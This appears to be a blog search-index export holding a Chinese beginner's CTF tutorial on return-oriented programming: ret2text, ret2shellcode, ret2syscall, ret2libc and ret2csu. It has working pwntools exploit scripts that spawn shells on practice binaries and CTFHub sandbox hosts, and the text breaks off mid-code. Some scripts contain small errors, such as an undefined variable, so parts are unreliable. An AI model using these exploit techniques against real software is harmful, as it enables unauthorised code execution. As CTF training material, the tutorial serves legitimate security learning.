<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>真的很菜菜的ROP</title>
    <link href="/2023/06/21/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/"/>
    <url>/2023/06/21/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/</url>
    
    <content type="html"><![CDATA[<p>栈上的简单小玩意们</p><span id="more"></span><hr><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming，面向返回编程），其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段( gadgets )来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p><p>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p><strong>实施ROP的条件</strong></p><ul><li>程序存在栈溢出，且可以控制返回地址</li><li>可以找到满足程序的 gadgets 以及相应的 gadgets 的地址</li></ul><blockquote><p>都是copy来的）看到有的人说这个叫“面向返回地址”编程哈哈。</p></blockquote><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>ret2text 即控制程序执行程序本身已有的的代码(.text)，比如<code>system(&quot;/bin/sh&quot;)</code>或者<code>system(&quot;cat flag&quot;)</code>。我们需要做的就是把这些代码段的调用地址覆盖到返回地址上。</p><p>我们在控制程序执行的时候也可以控制程序执行好几段不相邻的已有代码，这是我们需要知道对应返回的代码的位置。程序如果开启了某些保护，我们就需要想办法去绕过它。</p><h4 id="🌰-1"><a href="#🌰-1" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-14-08.png"></p><p>使用ida反编译main函数，发现gets()语句，可以利用栈溢出</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-30-17.png"></p><p>而后我们在secure中可以找到调用<code>system(&#39;&quot;/bin/sh&quot;)</code>的代码，如果我们控制程序返回到这个指令，就可以获得系统的shell</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-25_17-31-37.png"></p><p>查看代码地址为0x0804863A，接下来构造playload。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2text&#x27;</span>)<br>target = <span class="hljs-number">0x804863a</span><br>sh.sendline(<span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">0x6c</span>+<span class="hljs-number">4</span>) + p32(target))<br>sh.interactive()<br></code></pre></td></tr></table></figure><h4 id="🌰-2"><a href="#🌰-2" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p>来自CTFHUB的ret2text ，我不知道怎么复制题目链接，自己点进去找叭<a href="https://www.ctfhub.com/#/skilltree">CTFHub</a></p><p>查看文件信息</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-47-25.png"></p><p>拖进32位IDA反编译发现main函数存在gets栈溢出漏洞</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-51-25.png"></p><p>shift+F12打开字符串窗口发现&#x2F;bin&#x2F;sh语句</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_14-56-54.png"></p><p>去到对应的语句部分可以发现该程序将&#x2F;bin&#x2F;sh放到了rdi后，并且调用了sysytem</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_15-00-09.png"></p><blockquote><p>64位系统中rdi，rsi，rdx，rcx，r8，r9作为调用函数的前6个参数，如果参数多于6个，其余参数放入栈中。与此对比，32位系统中由于寄存器有限，调用函数时参数都放入栈中</p></blockquote><p>找一个变量双击可以看到各个变量对应的虚拟内存地址，构造playload就可以先用0x70个自节填满s变量，再用8个字节填满r，最后加上&#x2F;bin&#x2F;sh的地址。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_15-06-55.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;challenge-e20ddfc12b209019.sandbox.ctfhub.com&#x27;</span>, <span class="hljs-number">34749</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x70</span> + <span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x4007B8</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;Welcome to CTFHub ret2text.Input someting:\n&#x27;</span>, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>‘+4’ 是因为32位程序要覆盖的ebp是四个字节，64位程序需要覆盖八字节的rbp</p></blockquote><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>就是篡改栈帧上的返回地址为攻击者手动传入的shellcode所在缓冲区地址。我们可以利用pwntools中的shellcraft.sh()编写shellcode。</p><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p><h4 id="🌰-1-1"><a href="#🌰-1-1" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>点击下载题目: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p><p>查看文件信息：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-40-56.png"></p><p>进入main函数反编译一下：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-46-07.png"></p><p>发现gets和strncpy存在栈溢出漏洞，但系统没有现成的‘bin&#x2F;sh’指令给我们用。我们要自己写🥲</p><p>那怎么写呢？这时就要请出我们的得力助手pwntools，在pwntools下可以自动生成shellcode脚本。</p><p>gets获得输入的s变量，并将其复制到buf2处。双击buf2可以跳转到其所在位置，我们发现buf2在.bss段，所在段地址为0x0804a080</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_10-49-27.png"></p><p>调试下程序，看看这一个 bss 段是否可执行，显示rwxp就是可以。</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-15_11-02-42.png"></p><p>有权限就意味着我们可以将shellcode通过strncpy函数放进buf2这个区域，在触发溢出后将返回地址指向buf2这里即可拿到shell。</p><p>确定要覆盖的 return address 的偏移量相对于栈顶为 112 个字节。</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br><br>shellcode = asm(shellcraft.sh())<br>buf2_addr = <span class="hljs-number">0x804a080</span><br><br>sh.sendline(shellcode.ljust(<span class="hljs-number">112</span>, <span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf2_addr))<br>sh.interactive()<br></code></pre></td></tr></table></figure><h4 id="🌰-2-1"><a href="#🌰-2-1" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p>还是CTFHub的题目。放进ubuntu查看文件信息：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_20-00-41.png"></p><p>NX disabledz，即将shellcode放在数据段，即可执行</p><p>出现了一个新的变量RWX！</p><p>用IDA反编译题目main函数发现栈溢出漏洞</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-03-26_20-03-42.png"></p><p>我们可以知道buf相对于ebp的偏移量是0x10，所以我们需要填充(0x10+8)的数据。</p><p>双击buf查看程序中的变量信息</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-04-14_20-33-36.png"></p><p>r即为返回地址，有0x8的偏移量，所以总共需要填充的数据长度是 (0x10+0x8+0x8)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;challenge-a0bc34814de46f67.sandbox.ctfhub.com&#x27;</span>, <span class="hljs-number">37477</span>)<br>io.recvuntil(<span class="hljs-string">b&#x27;[&#x27;</span>)<br>buf_address = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&#x27;]&#x27;</span>)[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">&#x27;buf_address =&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(buf_address).upper())<br>shellcode_address = buf_address+<span class="hljs-number">0x20</span> <span class="hljs-comment"># buf与rbp的距离0x10 + rbp的宽度0x8 + 返回地址的长度0x8</span><br>log.success(<span class="hljs-string">&#x27;buf_address =&gt; %s&#x27;</span> % <span class="hljs-built_in">hex</span>(shellcode_address).upper())<br>shellcode = asm(shellcraft.sh())<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span> + <span class="hljs-number">4</span>) + p64(shellcode_address) + shellcode<br>io.recv()<br>io.sendline(payload)<br>io.interactive()     <br></code></pre></td></tr></table></figure><blockquote><p>这也太深奥了没搞懂，有缘再说</p></blockquote><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>ret2syscall即控制程序执行系统调用，从而获取shell。前提是程序需要有int 0x80这样的系统调用的gadget.</p><p>在ret2shellcode的情境下，如果开启了NX，那我们写到栈中的shellcode就会被CPU报错而不可执行。这种情况下，我们可以尝试使用ret2syscall的方法。</p><p>ret2syscall就是指通过手机带有ret指令的指令片段拼接成我们需要的shellcode。</p><blockquote><p>ret 指令可以理解为取栈顶的数据作为下次跳转的位置，即 eip&#x3D;[esp]  esp&#x3D;[esp+4]</p><p>或者理解为 pop eip，jmp   </p><p>取栈顶数据作为下次跳转的位置，然后跳转;</p><p>同理call也可以理解为 push rip, jmp  </p><p>将call指令的下一条指令地址压入栈，然后跳转</p></blockquote><h4 id="🌰"><a href="#🌰" class="headerlink" title="🌰:"></a>🌰:</h4><p> bamboofox 中的 ret2syscall </p><p>首先检测程序开启的保护：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_15-47-19.png"></p><p>查看其源码寻找利用点：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_15-48-31.png"></p><p>main 函数里有 gets 可以实现栈溢出，计算偏移量为112。</p><p>接下来进行系统调用构造，利用ROPgadget查找对应的gadget：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-23-31.png"></p><p>选择0x080bb196的这段</p><p>同样，找到其他的gadgets</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-26-17.png"></p><p>这里可以同时控制三个寄存器，我们选它</p><p>选好所有的gadgets就拼接起来构造payload就好喽</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&#x27;/var/run/vmblock-fuse/blockdir/OMFuQ4/rop&#x27;</span>)  //这文件我直接拖进去的文件地址好长<br><br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806eb90</span><br>binsh = <span class="hljs-number">0x080be408</span><br>pop_eax = <span class="hljs-number">0x080bb196</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br><br>payload = flat([<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span>, pop_edx_ecx_ebx, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh,pop_eax, <span class="hljs-number">0xb</span>, int_0x80])<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="关于linux系统调用的实现"><a href="#关于linux系统调用的实现" class="headerlink" title="关于linux系统调用的实现"></a>关于linux系统调用的实现</h4><h5 id="系统调用的步骤"><a href="#系统调用的步骤" class="headerlink" title="系统调用的步骤"></a>系统调用的步骤</h5><p>Linux的系统调用需要通过 int 80 实现，用系统调用号来区分入口函数。操作系统实现调用的基本过程如下：</p><ul><li>应用程序调用库函数</li><li>API将系统调用号存入EAX，然后通过中断调用时系统进入内核态</li><li>内核中的中断处理函数根据系统调用号，调用到对应的内核函数（系统调用）</li><li>系统调用完成相应的功能，将返回值存入EAX，返回到中断处理函数</li><li>中断处理函数返回到API</li><li>API将EAX返回给应用程序</li></ul><blockquote><p>系统调用号：</p><p>在Linux系统中，每个系统调用都被赋予一个系统调用号。系统调用号一旦分配就不能再有任何变更，否则编译好的应用程序就会崩溃；此外，如果一个系统调用被删除，它所占用的系统调用号也不允许被回收利用。这样，通过系统调用号就可以关联系统调用。</p><p>比如32位下调用 execve(“&#x2F;bin&#x2F;sh”,NULL,NULL) ，Linux系统调用通过int 0x80指令开始系统调用，exceve对应的系统调用号是0xb</p></blockquote><h5 id="举个栗子🌰："><a href="#举个栗子🌰：" class="headerlink" title="举个栗子🌰："></a>举个栗子🌰：</h5><p>函数<code>execve(&quot;/bin/sh&quot;,null,null)</code></p><p>其函数调用过程应该是：</p><ul><li>系统调用号存入EAX，即eax应该是0xb</li><li>依次传入三个参数，即ebx指向&#x2F;bin&#x2F;sh的地址或者sh的地址；ecx为0；edx为0</li></ul><p>我们可以知道系统在调用时会用到eax，ebx，ecx，edx四个寄存器，那么我们就可以将以上的内容写为<code>int 0x80(eax,ebx,ecx,edx)</code>。只要把对应的参数放到相应的寄存器中，再执行int 0x80就可以执行相应的系统调用。</p><p>那该怎么控制呢？🤨 <del>把刀架在寄存器脖子上</del></p><p>我们们可以使用pop和ret指令组合来控制寄存器的值以及执行方向。</p><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>ROPgadget和ropper，两个都可可以找，目标汇编代码片段，ROPgadget速度更快但是查找结果并不完整；ropper速度相对较慢但查找结果精准。</p><p>对于静态生成的程序，我们可以不用每一次都一条一条的去找命令，可以直接生成一条ROP链</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">ropper</span> <span class="hljs-literal">--</span><span class="hljs-comment">file inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">chain execverropper</span> <span class="hljs-literal">--</span><span class="hljs-comment">file inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">chain execve</span><br><span class="hljs-comment">ROPgadget</span> <span class="hljs-literal">--</span><span class="hljs-comment">binary inndy_rop</span> <span class="hljs-literal">--</span><span class="hljs-comment">ropchain</span><br></code></pre></td></tr></table></figure><h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>ret2libc即控制函数执行libc中的函数，通常是返回值某个函数的plt处或者函数的具体位置（即函数对应的got表项的内容）。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，我们需要知道 system 函数的地址。</p><h4 id="🌰-1-2"><a href="#🌰-1-2" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>CTF Wiki 的题，超简单的所有信息都给出的新手题目 <del>我都会做</del></p><p>首先查看安全保护</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-39-30.png"></p><p>源程序为 32 位，开启了 NX 保护。看一下程序源代码，确定栈溢出利用位置</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-42-44.png"></p><p>gets可以栈溢出。</p><p>我们可以找到system函数和’bin&#x2F;sh’字符串</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-46-14.png"></p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-48-21.png"></p><p>我们就可以直接返回 system 的地址</p><p>计算偏移量为112，构造payload。需要注意，我们调用system函数，会有一个对应的四字节的返回地址，我们需要将其填充后再附上我们的 ‘&#x2F;bin&#x2F;sh’ 字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process( <span class="hljs-string">&#x27;/var/run/vmblock-fuse/blockdir/Cm8v0D/ret2libc1&#x27;</span>)<br><br>binsh_addr = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x08048460</span><br><br>payload=flat([<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span>, system_plt, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>, binsh_addr])<br><br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h4 id="🌰-2-2"><a href="#🌰-2-2" class="headerlink" title="🌰_2:"></a>🌰_2:</h4><p>同样是32位的程序开启NX保护，有一个gets可以利用。有system函数但没有 ‘&#x2F;bin&#x2F;sh’ 字符串，但是有一个gets()函数，我们可以自己读取。同时我们在.bss段发现一个buf可以传参，可以把字符串填在这里</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-25_16-44-44.png"></p><p>编写exp：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br><br>r=process(&#x27;/var/run/vmblock-fuse/blockdir/wD0Lp7/ret2libc2&#x27;)<br><br>buf_addr = 0x804A080<br>gets_addr = 0x8048460<br>sys_addr = 0x8048490<br><br>payload = flat( [&#x27;A&#x27;*112, gets_addr, sys_addr, buf_addr, buf_addr] )<br>r.sendline(payload)<br>r.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><br>r.interactive()<br><br></code></pre></td></tr></table></figure><p>payload解释：</p><ul><li><code>&#39;A&#39;*112</code>：填充112个字符’A’溢出缓冲区，覆盖返回地址。</li><li><code>gets_addr</code>：将<code>gets</code>函数的地址作为原本程序的gets()函数的返回地址，控制程序流程跳转到<code>gets</code>函数。</li><li><code>sys_addr</code>：<code>system</code>函数的地址，将作为<code>gets</code>函数返回后的下一个地址，控制程序流程跳转到<code>system</code>函数。</li><li><code>buf_addr</code>：缓冲区的地址，作为<code>system</code>函数的参数，传递给<code>system</code>函数的命令字符串所在的内存地址。</li><li><code>buf_addr</code>：再次使用缓冲区的地址，作为<code>gets</code>函数的参数，使得<code>gets</code>函数将用户输入的命令字符串写入到缓冲区。</li></ul><h4 id="🌰-3"><a href="#🌰-3" class="headerlink" title="🌰_3:"></a>🌰_3:</h4><p>这次system也没了🤨，其他的保护和漏洞都和例一例二一样。除此之外，题目中又给了一个 libc.so 动态链接库。</p><p>那怎么得到system的地址呢？</p><p>补课时间到！</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，<a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul><p>除此之外我们还要知道，A 真实地址 (内存物理地址) - A 偏移地址 &#x3D; B 真实地址 (内存物理地址) -B 偏移地址 &#x3D; 基地址。也就是说，<strong>B的真实地址&#x3D;基地址+B的偏移地址</strong>。</p><p><strong>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</strong></p><p>那该如何获得已知函数的地址呢？</p><p>got表泄露！输出某个函数对应的got表内容，注意libc的延迟绑定机制，got表中只有已经执行过的函数有真实地址，我们需要泄露已经执行过的函数地址。再在程序中查询偏移进一步获得system地址。</p><p>但是！这样太麻烦啦我们可以用工具：<a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a> </p><p>exp：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import *<br><br>sh = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br><br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>got_puts = elf.got[&#x27;puts&#x27;]<br>got_libc_startmain = elf.got[&#x27;__libc_start_main&#x27;]<br>main = elf.symbols[&#x27;main&#x27;]<br><br>payload1 = flat( [b&#x27;A&#x27;*112, puts_plt, main, got_puts] )<br>sh.sendlineafter(&#x27;!?&#x27;, payload1)<br>puts_addr = u32(sh.recv(4))<br><br><span class="hljs-comment"># libc6_2.27-3ubuntu1.2_i386</span><br>libc_puts = 0x67c10 <span class="hljs-comment">#offset</span><br>libc_system = 0x3d250<br>libc_binsh = 0x17e3cf<br><br>libc_base = puts_addr - libc_puts<br>system_addr = libc_base + libc_system<br>binsh_addr = libc_base + libc_binsh<br><br>payload2 = flat( [b&#x27;A&#x27;*112, system_addr, 0xcafebabe, binsh_addr] )<br>sh.sendlineafter(&#x27;!?&#x27;, payload2)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><p>了解ret2csu之前先了解一下attached code的概念。</p><p>我们编译一个简单的只有一个main函数的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">include&lt;stdio.h&gt;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(jint argc,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看可执行文件的函数符号：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nm</span> -<span class="hljs-keyword">a</span> [filename] | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;t\|T&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-28_20-37-10.png"></p><p>可以发现除了 main 函数还有很多其它函数，这些函数是编译器附加到可执行文件中的，称之为 attached code 。这些 attached code 在main 函数之前执行，负责加载或者链接库文件。我们可以从 attached code 中寻找可以利用的 gadgets。</p><p>我们利用 <code>objdum -D [filename] </code>命令查看文件反汇编代码可以看到 <code>__libc_csu_init()</code> 函数中存在以下gadget：</p><p><img src="/img/%E7%9C%9F%E7%9A%84%E5%BE%88%E8%8F%9C%E8%8F%9C%E7%9A%84ROP/Snipaste_2023-05-28_20-50-34.png"></p><p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 <code>__libc_csu_init</code> 中的 gadgets。我们可以在执行完第二个gadget后ret到第一个gadget，这样就可以控制很多关键寄存器的值。</p><p>需要注意的是，这种方法不能控制rax的值，也就无法进行系统调用，因为系统调用号在rax里。但我们可以通过write等函数泄露got表中的函数地址，然后计算出libc地址。</p><p>有以下几种利用场景：</p><ul><li>ret2csu泄露libc地址后利用libc中的gadget</li><li>ret2csu配合pop rax;syscall;等gadget直接getshell</li><li>开启pie的情况下，利用offset2lib进行ret2csu,或者直接利用libc中的gadget getshell</li></ul><blockquote><p>offset2lib简单来说就是泄露任意代码段地址即可推得所有共享库地址,因为共享库之间的offset是固定的.</p></blockquote><h4 id="🌰-1-3"><a href="#🌰-1-3" class="headerlink" title="🌰_1:"></a>🌰_1:</h4><p>题目链接：<a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5%E3%80%82">https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5。</a></p><p>题目没有开启pie和canary保护。</p><p>蒸米师傅给了源码，我们自己拖到 ida 里也能判断出代码的基本逻辑，main() 函数里还有一个 <code>vulnerable_function()</code> 函数 ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>];<br>read(STDIN_FILENO, buf, <span class="hljs-number">512</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> 